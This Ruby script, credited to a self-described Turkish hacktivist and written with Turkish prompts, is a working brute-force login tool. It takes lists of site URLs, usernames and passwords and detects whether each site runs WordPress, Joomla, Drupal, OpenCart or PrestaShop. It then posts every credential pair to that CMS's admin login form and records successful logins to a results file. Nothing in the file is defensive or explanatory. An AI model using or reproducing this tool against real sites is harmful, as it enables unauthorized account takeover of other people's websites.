require 'net/http'
require 'uri'
require 'colorize'

def ascii_yazdir
  puts %q{
 ____             _                  _       _   _ _______________ 
 |  _ \  __ _ _ __| | _____  ___ _ __(_)_ __ | |_/ |___ /___ /___  |
 | | | |/ _` | '__| |/ / __|/ __| '__| | '_ \| __| | |_ \ |_ \  / / 
 | |_| | (_| | |  |   <\__ \ (__| |  | | |_) | |_| |___) |__) |/ /  
 |____/ \__,_|_|  |_|\_\___/\___|_|  |_| .__/ \__|_|____/____//_/   
                                       |_|                          
  }
  puts "\033[92mCoder By: RootAyyildiz Turkish Hacktivist\033[0m\n"
end

print "Site URL'lerinin olduğu .txt dosyasının yolunu girin: "
sites_file = gets.chomp

print "Kullanıcı adı listesinin olduğu .txt dosyasının yolunu girin: "
usernames_file = gets.chomp

print "Şifre listesinin olduğu .txt dosyasının yolunu girin: "
passwords_file = gets.chomp

sites = File.readlines(sites_file).map(&:chomp)
usernames = File.readlines(usernames_file).map(&:chomp)
passwords = File.readlines(passwords_file).map(&:chomp)

result_file = "brute_force_results.txt"

cms_signatures = {
  'WordPress' => '/wp-login.php',
  'Joomla' => '/administrator/index.php',
  'Drupal' => '/user/login',
  'OpenCart' => '/admin/index.php',
  'PrestaShop' => '/admin-dev/index.php',
  'WooCommerce' => '/wp-login.php'
}
def detect_cms(site, cms_signatures)
  cms_signatures.each do |cms, path|
    begin
      uri = URI.parse(site + path)
      response = Net::HTTP.get_response(uri)
      if response.code == "200"
        return cms
      end
    rescue => e
      puts "Siteye ulaşılamadı: #{site} - Hata: #{e.message}".red
    end
  end
  return nil
end

File.open(result_file, "w") do |file|
  sites.each do |site|
    if !site.start_with?("http://") && !site.start_with?("https://")
      site = "http://#{site}"
    end

    cms = detect_cms(site, cms_signatures)
    if cms
      puts "CMS Tespit Edildi: #{cms} - Site: #{site}".light_blue
    else
      puts "CMS Tespit Edilemedi: #{site}".red
      next
    end

    usernames.each do |username|
      passwords.each do |password|
        puts "Denenen kullanıcı adı: #{username}, Şifre: #{password}".yellow

        begin
          login_path = cms_signatures[cms]
          uri = URI.parse(site + login_path)
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = uri.scheme == 'https'
          request = Net::HTTP::Post.new(uri.path)
          
          form_data = case cms
                      when 'WordPress', 'WooCommerce'
                        { 'log' => username, 'pwd' => password }
                      when 'Joomla'
                        { 'username' => username, 'passwd' => password }
                      when 'Drupal'
                        { 'name' => username, 'pass' => password }
                      when 'OpenCart', 'PrestaShop'
                        { 'username' => username, 'password' => password }
                      else
                        {}
                      end
                      
          request.set_form_data(form_data)
          response = http.request(request)
          
          if response.body.include?("Dashboard") || response.body.include?("Welcome")
            puts "Başarılı giriş: #{site}, Kullanıcı: #{username}, Şifre: #{password}".green
            file.puts("Başarılı giriş: #{site}, Kullanıcı: #{username}, Şifre: #{password}")
          end
        rescue => e
          puts "Bir hata oluştu: #{e.message}".red
        end
      end
    end
  end
end

puts "İşlem tamamlandı. Sonuçlar '#{result_file}' dosyasına kaydedildi.".light_green
